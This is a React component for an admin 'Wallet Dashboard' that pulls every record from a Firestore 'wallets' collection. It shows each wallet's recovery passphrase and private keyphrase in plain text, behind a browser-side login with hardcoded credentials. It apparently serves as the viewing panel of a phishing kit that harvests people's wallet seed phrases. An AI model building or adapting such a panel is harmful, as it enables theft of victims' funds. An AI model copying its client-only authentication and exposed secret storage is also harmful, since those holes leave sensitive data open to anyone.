"use client"
import { useState, useEffect } from 'react';
import { db } from '@/firebaseConfig';
import { collection, getDocs } from 'firebase/firestore';

const WalletDashboard = () => {
  const [wallets, setWallets] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loginData, setLoginData] = useState({
    email: '',
    password: ''
  });
  const [loginError, setLoginError] = useState('');

  useEffect(() => {
    if (isAuthenticated) {
      const fetchWallets = async () => {
        try {
          const querySnapshot = await getDocs(collection(db, 'wallets'));
          const walletsData = [];
          
          querySnapshot.forEach((doc) => {
            walletsData.push({
              id: doc.id,
              ...doc.data()
            });
          });

          setWallets(walletsData);
          setLoading(false);
        } catch (err) {
          setError('Failed to fetch wallet data');
          console.error(err);
          setLoading(false);
        }
      };

      fetchWallets();
    }
  }, [isAuthenticated]);

  const handleLogin = (e) => {
    e.preventDefault();
    if (loginData.email === 'admin@admin.com' && loginData.password === '11111111') {
      setIsAuthenticated(true);
      setLoginError('');
    } else {
      setLoginError('Invalid email or password');
      
    }
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setLoginData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  if (!isAuthenticated) {
    return (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
        <div className="bg-white rounded-lg shadow-xl p-6 w-full max-w-md">
          <h2 className="text-2xl font-bold text-gray-800 mb-6 text-center">Admin Login</h2>
          
          <form onSubmit={handleLogin}>
            <div className="mb-4">
              <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
                Email
              </label>
              <input
                type="email"
                id="email"
                name="email"
                value={loginData.email}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="admin@example.com"
                required
              />
            </div>
            
            <div className="mb-6">
              <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
                Password
              </label>
              <input
                type="password"
                id="password"
                name="password"
                value={loginData.password}
                onChange={handleInputChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="********"
                required
              />
            </div>
            
            {loginError && (
              <div className="mb-4 text-red-600 text-sm text-center">
                {loginError}
              </div>
            )}
            
            <button
              type="submit"
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-md transition duration-200"
            >
              Login
            </button>
          </form>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="flex justify-center items-center h-screen">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex justify-center items-center h-screen">
        <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded">
          {error}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen max-[500px]:pt-[1500px] bg-transparent pt-[900px] p-6">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-3xl font-bold text-white mb-8">Wallet Dashboard</h1>
        
        {wallets.length === 0 ? (
          <div className="bg-white p-6 rounded-lg shadow">
            <p className="text-white">No wallet data found</p>
          </div>
        ) : (
          <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
            {wallets.map((wallet) => (
              <div key={wallet.id} className="bg-white rounded-lg shadow-md overflow-hidden hover:shadow-lg transition-shadow">
                <div className="p-6 w-[300px]">
                  <div className="flex justify-between items-start mb-4">
                    <h2 className="text-xl font-semibold text-gray-800">{wallet.walletName || 'Unnamed Wallet'}</h2>
                    <span className="inline-block bg-green-100 text-green-800 text-xs px-2 py-1 rounded-full">
                      Active
                    </span>
                  </div>
                  
                  <div className="space-y-4">
                    <div>
                      <p className="text-sm text-gray-500">Wallet ID</p>
                      <p className="text-gray-700 font-mono text-sm break-all">{wallet.id}</p>
                    </div>
                    
                    <div>
                      <p className="text-sm text-gray-500">Recovery Passphrase</p>
                      <p className="text-gray-700 font-mono text-sm overflow-x-scroll">{wallet.passphrase || 'N/A'}</p>
                    </div>
                    
                    <div>
                      <p className="text-sm text-gray-500">Private Keyphrase</p>
                      <p className="text-gray-700 overflow-x-scroll">{wallet.keyphrase || '0'}</p>
                    </div>
                    
                    {wallet.connectedAt && (
                      <div>
                        <p className="text-sm text-gray-500">Connected Since</p>
                        <p className="text-gray-700">
                          {new Date(wallet.connectedAt.seconds * 1000).toLocaleString()}
                        </p>
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="bg-gray-50 px-6 py-3 flex justify-end space-x-3">
                  <button className="text-blue-600 hover:text-blue-800 text-sm font-medium">
                    View Details
                  </button>
                  <button className="text-red-600 hover:text-red-800 text-sm font-medium">
                    Disconnect
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default WalletDashboard;